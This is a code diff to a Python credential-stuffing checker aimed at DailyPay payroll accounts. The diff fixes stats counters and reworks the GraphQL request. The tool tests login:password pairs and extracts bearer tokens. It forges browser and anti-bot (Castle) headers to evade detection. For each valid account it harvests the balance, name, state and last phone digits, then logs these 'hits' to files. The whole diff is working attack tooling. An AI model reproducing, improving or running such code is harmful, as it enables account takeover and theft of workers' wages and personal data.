@@ -42,11 +42,11 @@ def update_title():
 	ctypes.windll.kernel32.SetConsoleTitleW(text)
 
 def update_stats(key: str, value: int, final: bool = False) -> object:
-	if bool and key in 'bans:hits:custom:fails':
+	if final and key in 'bans:hits:custom:fails':
 		stats['checked'] += 1
 		stats['remaining'] -= 1
 	if key in 'hits:custom:fails':
-		stats['requests_count'] += 1
+		stats['requests_count'] += 1.4
 	stats[key] += value
 	update_cpm()
 	update_title()
@@ -143,16 +143,15 @@ class CheckerClient:
 			elif not success: raise last_error
 
 			if 'Incorrect access, please try again' in req.text:
-				update_stats('fails', 1)
+				update_stats('fails', 1, True)
 				return False
 			elif req.status_code == 403:
 				await write_to_file(accounts_path, f'{login}:{password}\n')
-				update_stats('bans', 1)
+				update_stats('bans', 1, True)
 				return False
 
 
 			token = str(req.url).split('#access_token=')[1].split('&')[0]
-			# print(token)
 			headers['Authorization'] = f'Bearer {token}'
 			while True:
 				try:
@@ -161,7 +160,7 @@ class CheckerClient:
 																				  headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent}))
 					if req.status_code == 404:
 						await write_to_file(custom_path, f'{login}:{password} | new_profile = True\n')
-						update_stats('custom', 1)
+						update_stats('custom', 1, True)
 						print(f'[+] Custom: {login}:{password} | new_profile = True')
 						return False
 					# print(f'{login}:{password}', req, req.url)
@@ -182,26 +181,18 @@ class CheckerClient:
 			last_name = req_json['lastName']
 			state = req_json['stateOfResidence']
 
-			headers['x-app-bundle'] = 'com.DailyPay.DailyPay'
-			headers['x-app-version'] = 'undefined'
-			headers['x-castle-request-token'] = castle_token
-			headers['x-correlation-id'] = ''
-			req = await self.loop.run_in_executor(None, functools.partial(session.post,
-																		  'https://employees-api.dailypay.com/graphql',
-																		  headers=headers,
-																		  json={'operationName': 'testAuth',
-																				'variables': {},
-																				'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
+			castle_token, user_agent = await self.get_castle_token()
+			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://employees-api.dailypay.com/graphql', headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','content-type': 'application/json','credentials': 'include','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="126", "Not;A=Brand";v="24", "Google Chrome";v="126"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent,'x-app-bundle': 'com.DailyPay.DailyPay','x-app-version': 'undefined','x-castle-request-token': castle_token,'x-correlation-id': ''}, json={'operationName': 'testAuth','variables': {},'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
 			# print(f'graphql-{login}:{password}', req, req.headers)
 			is_challenge = req.headers.get('X-Account-Challenged', True)
 			phone = req.headers.get('X-Phone-Last-Four', None)
-			if not is_challenge:
-				await write_to_file(custom_path, f'{login}:{password}:{token}\n')
-				update_stats('custom', 1)
+			# if not is_challenge:
+			# 	await write_to_file(custom_path, f'{login}:{password}:{token}\n')
+			# 	update_stats('custom', 1)
 
 			text = f'{login}:{password} | balance = [{balance} {currency}] | firstName = {first_name} | lastName = {last_name} | state = {state.upper()} | PhoneNumber = {phone}'
 			await write_to_file(hits_save_path, f'{text}\n')
-			update_stats('hits', 1)
+			update_stats('hits', 1, True)
 			print(f'[+] Valid: {text}')
 			return True
 		except tls_client.exceptions.TLSClientExeption:
